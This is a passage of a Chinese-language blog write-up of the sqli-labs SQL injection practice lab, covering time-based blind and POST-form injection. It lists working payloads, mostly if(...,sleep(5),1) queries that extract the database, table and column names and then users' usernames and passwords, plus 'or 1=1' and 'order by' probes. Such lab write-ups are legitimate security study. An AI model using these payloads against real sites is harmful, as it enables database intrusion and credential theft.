+<p><img src="/2023/06/24/sqls-lab/image-20230624160142992.png" alt="image-20230624160142992"></p>
+<p>发现页面不发生变化，布尔盲注依赖于页面不同反应，这里应该使用时间盲注，时间注入和布尔盲注两种没有多大差别只不过时间盲注多了if函数和sleep()函数</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">id</span>=1&#x27; <span class="keyword">and</span> <span class="keyword">if</span>(<span class="attribute">1</span>=1,sleep(5),1)--+</span><br><span class="line">判断参数构造。</span><br><span class="line">?<span class="attribute">id</span>=1&#x27;and <span class="keyword">if</span>(length((select database()))&gt;9,sleep(5),1)--+</span><br><span class="line">判断数据库名长度</span><br><span class="line"> </span><br><span class="line">?<span class="attribute">id</span>=1&#x27;and <span class="keyword">if</span>(ascii(substr((select database()),1,1))=115,sleep(5),1)--+</span><br><span class="line">逐一判断数据库字符</span><br><span class="line">?<span class="attribute">id</span>=1&#x27;and <span class="keyword">if</span>(length((select group_concat(table_name) <span class="keyword">from</span> information_schema.tables where <span class="attribute">table_schema</span>=database()))&gt;13,sleep(5),1)--+</span><br><span class="line">判断所有表名长度</span><br><span class="line"> </span><br><span class="line">?<span class="attribute">id</span>=1&#x27;and <span class="keyword">if</span>(ascii(substr((select group_concat(table_name) <span class="keyword">from</span> information_schema.tables where <span class="attribute">table_schema</span>=database()),1,1))&gt;99,sleep(5),1)--+</span><br><span class="line">逐一判断表名</span><br><span class="line">?<span class="attribute">id</span>=1&#x27;and <span class="keyword">if</span>(length((select group_concat(column_name) <span class="keyword">from</span> information_schema.columns where <span class="attribute">table_schema</span>=database() <span class="keyword">and</span> <span class="attribute">table_name</span>=<span class="string">&#x27;users&#x27;</span>))&gt;20,sleep(5),1)--+</span><br><span class="line">判断所有字段名的长度</span><br><span class="line"> </span><br><span class="line">?<span class="attribute">id</span>=1&#x27;and <span class="keyword">if</span>(ascii(substr((select group_concat(column_name) <span class="keyword">from</span> information_schema.columns where <span class="attribute">table_schema</span>=database() <span class="keyword">and</span> <span class="attribute">table_name</span>=<span class="string">&#x27;users&#x27;</span>),1,1))&gt;99,sleep(5),1)--+</span><br><span class="line">逐一判断字段名。</span><br><span class="line">?<span class="attribute">id</span>=1&#x27; <span class="keyword">and</span> <span class="keyword">if</span>(length((select group_concat(username,password) <span class="keyword">from</span> users))&gt;109,sleep(5),1)--+</span><br><span class="line">判断字段内容长度</span><br><span class="line"></span><br><span class="line">?<span class="attribute">id</span>=1&#x27; <span class="keyword">and</span> <span class="keyword">if</span>(ascii(substr((select group_concat(username,password) <span class="keyword">from</span> users),1,1))&gt;50,sleep(5),1)--+</span><br><span class="line">逐一检测内容。</span><br></pre></td></tr></table></figure>
+<h1 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h1><h2 id="Error-Based-1"><a href="#Error-Based-1" class="headerlink" title="Error Based"></a>Error Based</h2><p><img src="/2023/06/24/sqls-lab/image-20230624161449627.png" alt="image-20230624161449627"></p>
+<p>输入1’报错<br><img src="/2023/06/24/sqls-lab/image-20230624161524526.png" alt="image-20230624161524526"></p>
+<p>所以输入恒成立语句就可以了，比如1’ or 1=1#</p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624161710978.png" alt="image-20230624161710978"></p>
+<p>爆破列数：1’ order by x#</p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624161929155.png" alt="image-20230624161929155"></p>
+<p>order by 2无报错<br>因为有回显使用联合查询，后面步骤一样</p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624162324042.png" alt="image-20230624162324042"></p>
+<h2 id="Double-Injection-1"><a href="#Double-Injection-1" class="headerlink" title="Double Injection"></a>Double Injection</h2><p><img src="/2023/06/24/sqls-lab/image-20230624162621603.png" alt="image-20230624162621603"></p>
+<p>成功登录但是无回显，无法使用联合查询，但是正确错误页面不同，所以使用布尔盲注</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/06/14/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="prev" title="反序列化">
+      <i class="fa fa-chevron-left"></i> 反序列化
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/06/24/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="next" title="文件包含">
+      文件包含 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#GET"><span class="nav-number">1.</span> <span class="nav-text">GET</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Error-Based"><span class="nav-number">1.1.</span> <span class="nav-text">Error Based</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#single-quotes"><span class="nav-number">1.1.1.</span> <span class="nav-text">single quotes</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#intiger-based"><span class="nav-number">1.1.2.</span> <span class="nav-text">intiger based</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#single-quotes-with-twist"><span class="nav-number">1.1.3.</span> <span class="nav-text">single quotes with twist</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#double-quotes"><span class="nav-number">1.1.4.</span> <span class="nav-text">double quotes</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">1.2.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Double-Injection"><span class="nav-number">1.3.</span> <span class="nav-text">Double Injection</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#single-quotes-1"><span class="nav-number">1.3.1.</span> <span class="nav-text">single quotes</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Dump-into-Outfile"><span class="nav-number">1.4.</span> <span class="nav-text">Dump into Outfile</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Blind"><span class="nav-number">1.5.</span> <span class="nav-text">Blind</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Time-based"><span class="nav-number">1.6.</span> <span class="nav-text">Time based</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#POST"><span class="nav-number">2.</span> <span class="nav-text">POST</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Error-Based-1"><span class="nav-number">2.1.</span> <span class="nav-text">Error Based</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Double-Injection-1"><span class="nav-number">2.2.</span> <span class="nav-text">Double Injection</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="akali"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">akali</p>
+  <div class="site-description" itemprop="description">远赴人间惊鸿宴，一睹人间盛世颜</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">118</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">41</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+      <div id="music163player">
+        <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1859652717&auto=1&height=66"></iframe>
+        </iframe>
+      </div>
+
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2021-08 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">akali</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+
+
+<!-- 页面点击出现爱心 -->
+<script type="text/javascript" src="/js/src/love.js"></script>
+
+
+<!-- 页面点击出现烟花 -->
+
+ <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+ <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+ <script type="text/javascript" src="/js/src/fireworks.js"></script>
+
+</body>
+</html>
